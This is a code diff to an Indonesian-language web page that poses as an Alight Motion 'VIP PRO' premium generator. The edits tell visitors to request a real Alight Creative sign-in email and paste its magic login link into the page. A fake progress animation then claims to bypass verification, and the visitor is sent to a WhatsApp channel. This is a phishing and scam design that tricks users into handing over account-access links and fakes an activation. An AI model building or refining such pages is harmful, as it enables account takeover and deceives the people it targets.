@@ -83,7 +83,7 @@
     
     .gen-container label { display: block; margin-bottom: 8px; font-size: 0.9em; font-weight: bold; }
     .gen-container input { width: 100%; padding: 10px; margin-bottom: 10px; font-family: inherit; border-radius: 4px; }
-    .gen-container button { width: 100%; padding: 10px; cursor: pointer; font-family: inherit; border-radius: 4px; font-weight: bold; transition: 0.3s; }
+    .gen-container button { width: 100%; padding: 10px; cursor: pointer; font-family: inherit; border-radius: 4px; font-weight: bold; transition: 0.3s; margin-bottom: 8px; }
     
     .status-text { display: none; font-size: 0.85em; margin-bottom: 10px; line-height: 1.4; }
     .status-text.active { display: block; }
@@ -133,16 +133,19 @@
                 <div id="genStep1">
                     <label>Masukkan Email Alight Motion:</label>
                     <input type="email" id="userEmail" placeholder="target@gmail.com">
-                    <button onclick="startGenerator()" class="gen-btn">Kirim Link Verifikasi</button>
+                    <button onclick="startGenerator()" class="gen-btn">Kirim Magic Link</button>
+                    
+                    <!-- Tombol Bantuan untuk memicu email asli dari AM -->
+                    <button onclick="bukaSitusAM()" style="font-size: 0.8em; background: transparent; border: 1px dashed #888; color: inherit;">Belum dapat email? Klik disini</button>
                 </div>
 
                 <div id="genStep2" style="display: none;">
                     <p class="status-text active" style="color: #ffcc00; font-weight: bold; margin-bottom: 10px;">
-                        Silakan buka aplikasi Alight Motion, login menggunakan email tadi, lalu salin link dari email "Alight Creative" yang kamu terima.
+                        Silakan cek email kamu. Klik tombol biru "Sign in to Alight Creative", copy link panjangnya, lalu tempel di bawah ini.
                     </p>
                     <label>Tempel Link dari Email:</label>
                     <input type="text" id="linkEmail" placeholder="https://alight-creative.firebaseapp.com/...">
-                    <button onclick="activatePremium()" class="gen-btn">Verifikasi & Aktifkan</button>
+                    <button onclick="activatePremium()" class="gen-btn">Verifikasi & Aktifkan VIP</button>
                 </div>
 
                 <div id="genStep3" style="display: none;">
@@ -191,6 +194,11 @@
         document.getElementById("linkEmail").value = "";
     }
 
+    function bukaSitusAM() {
+        // Membuka link login resmi Alight Creative (Supaya email beneran masuk)
+        window.open("https://alightcreative.com/auth_action/", "_blank");
+    }
+
     function startGenerator() {
         const email = document.getElementById("userEmail").value;
         if(email.trim() === "" || !email.includes("@")) {
@@ -198,8 +206,8 @@
             return;
         }
 
-        // Munculkan peringatan bahwa langkah selanjutnya ada di email
-        alert("Sistem telah memproses email: " + email + "\n\nLangkah selanjutnya:\n1. Buka aplikasi Alight Motion di HP kamu.\n2. Pilih login pakai email tadi.\n3. Cek email 'Alight Creative' yang masuk.\n4. Copy link panjangnya, lalu kembali ke sini dan tempel di kotak input.");
+        // Munculkan instruksi
+        alert("Email target disimpan: " + email + "\n\nLangkah selanjutnya:\n1. Klik tombol 'Belum dapat email? Klik disini' di bawah.\n2. Masukkan email kamu di situs yang terbuka.\n3. Cek Inbox/Spam email kamu (seperti gambar ke-2).\n4. Klik tulisan biru 'Sign in to Alight Creative'.\n5. Copy link panjangnya, balik ke sini, dan tempel.");
         
         // Sembunyikan step 1, munculkan step 2 (Input Link)
         document.getElementById("genStep1").style.display = "none";
@@ -222,10 +230,10 @@
         let progress = 0;
         
         let messages = [
-            "Membaca token akses dari link...",
+            "Membaca token akses...",
             "Mencocokkan data server...",
-            "Bypass verifikasi sistem...",
-            "Mengaktifkan lisensi VIP PRO...",
+            "Bypass verifikasi...",
+            "Mengaktifkan VIP PRO...",
             "Selesai!"
         ];
 
@@ -247,21 +255,17 @@
                     document.getElementById("genStep4").style.display = "block";
                 }, 500);
             }
-        }, 50); // Kecepatan loading
+        }, 50);
     }
 
     function openAlightMotion() {
         // =======================================================
-        // PENTING: GANTI LINK DI BAWAH INI DENGAN LINK TUJUAN KAMU
+        // LINK TUJUAN SUDAH DIPASANG KE CHANNEL WA KAMU
         // =======================================================
-        let linkAM = "LINK_ALIGHT_MOTION_KAMU_DISINI"; 
+        let linkAM = "https://whatsapp.com/channel/0029VbD8SsK4SpkJ9HjqBo1x"; 
         
-        if(linkAM === "LINK_ALIGHT_MOTION_KAMU_DISINI") {
-            alert("Admin belum memasang link Alight Motion-nya. Silakan hubungi admin.");
-        } else {
-            // Buka link di tab baru
-            window.open(linkAM, "_blank");
-        }
+        // Buka link di tab baru
+        window.open(linkAM, "_blank");
     }
 
     // ==========================================
